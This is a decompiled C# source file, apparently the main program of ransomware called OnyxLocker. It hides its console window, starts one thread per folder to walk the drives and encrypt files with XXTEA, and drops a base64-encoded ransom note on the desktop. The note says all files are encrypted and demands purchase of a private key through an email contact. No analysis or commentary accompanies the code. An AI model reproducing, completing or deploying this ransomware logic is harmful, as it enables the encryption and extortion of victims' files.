using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using OnyxLocker.Classes;

namespace OnyxLocker
{
	// Token: 0x02000009 RID: 9
	internal class Program
	{
		// Token: 0x06000017 RID: 23
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetConsoleWindow();

		// Token: 0x06000018 RID: 24
		[DllImport("user32.dll")]
		private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

		// Token: 0x06000019 RID: 25 RVA: 0x00002778 File Offset: 0x00000978
		private static void Main(string[] args)
		{
			Thread.Sleep(1);
			IntPtr consoleWindow = Program.GetConsoleWindow();
			Program.ShowWindow(consoleWindow, 0);
			IEncryptionProvider encryptionProvider = new XxteaEncryptionProvider();
			IFileParser fileParser = new FileParser(encryptionProvider);
			IFileChecker fileChecker = new FileChecker();
			IDriveExplorer driveExplorer = new FolderBrowser();
			List<string> startingFolders = driveExplorer.GetStartingFolders();
			List<Thread> encryptionThreads = Program.GetEncryptionThreads(startingFolders, new DirWalker(fileChecker, fileParser));
			encryptionThreads.ForEach(delegate(Thread encThread)
			{
				encThread.Start();
			});
			byte[] encryptionKey = encryptionProvider.GetEncryptionKey();
			byte[] bytes = Convert.FromBase64String("ISEhIEFMTCBZT1VSIEZJTEVTIEFSRSBFTkNSWVBURUQgISEhCgpBbGwgeW91ciBmaWxlcywgZG9jdW1lbnRzLCBwaG90b3MsIGRhdGFiYXNlcyBhbmQgb3RoZXIgaW1wb3J0YW50IGZpbGVzIGFyZSBlbmNyeXB0ZWQuCiEhISBZT1VSIEZJTEVTIEFSRSBFTkNSWVBURUQgISEhCkFsbCB5b3VyIGZpbGVzLCBkb2N1bWVudHMsIHBob3RvcywgZGF0YWJhc2VzIGFuZCBvdGhlciBpbXBvcnRhbnQKZmlsZXMgYXJlIGVuY3J5cHRlZC4KWW91IGFyZSBub3QgYWJsZSB0byBkZWNyeXB0IGl0IGJ5IHlvdXJzZWxmISBUaGVyZSBpcyBvbmx5IG9uZSBtZXRob2QKb2YgcmVjb3ZlcmluZyBmaWxlcyBpdCBpcyBwdXJjaGFzZSBhbiB1bmlxdWUgcHJpdmF0ZSBrZXkuCgpDb250YWN0IFRvIDogcmFuc29tLmRhdGFAZ21haWwuY29tCgoKQXR0ZW50aW9uIQogKiBEbyBub3QgcmVuYW1lIGVuY3J5cHRlZCBmaWxlcy4KICogRG8gbm90IHRyeSB0byBkZWNyeXB0IHlvdXIgZGF0YSB1c2luZyB0aGlyZCBwYXJ0eSBzb2Z0d2FyZSwgaXQgbWF5IGNhdXNlIHBlcm1hbmVudCBkYXRhIGxvc3Mu");
			string @string = Encoding.UTF8.GetString(bytes);
			MessageWriter messageWriter = new MessageWriter(@string, "RECOVERY INSTRUCTIONS", 10);
			messageWriter.WriteMessageToDesktop();
			encryptionThreads.ForEach(delegate(Thread encThread)
			{
				bool flag = encThread != null;
				if (flag)
				{
					encThread.Join();
				}
			});
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002858 File Offset: 0x00000A58
		private static List<Thread> GetEncryptionThreads(List<string> startFolders, DirWalker directoryWalker)
		{
			List<Thread> list = new List<Thread>();
			using (List<string>.Enumerator enumerator = startFolders.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					string folder = enumerator.Current;
					list.Add(new Thread(delegate()
					{
						directoryWalker.TraverseDirectories(folder);
					}));
				}
			}
			return list;
		}

		// Token: 0x04000006 RID: 6
		private const int SW_HIDE = 0;

		// Token: 0x04000007 RID: 7
		private const int SW_SHOW = 5;

		// Token: 0x0200000E RID: 14
		public class DummyParser : IFileParser
		{
			// Token: 0x06000034 RID: 52 RVA: 0x00002E35 File Offset: 0x00001035
			public void ParseFile(string filePath)
			{
				Thread.Sleep(1);
				Console.WriteLine("Parsing files");
			}
		}
	}
}
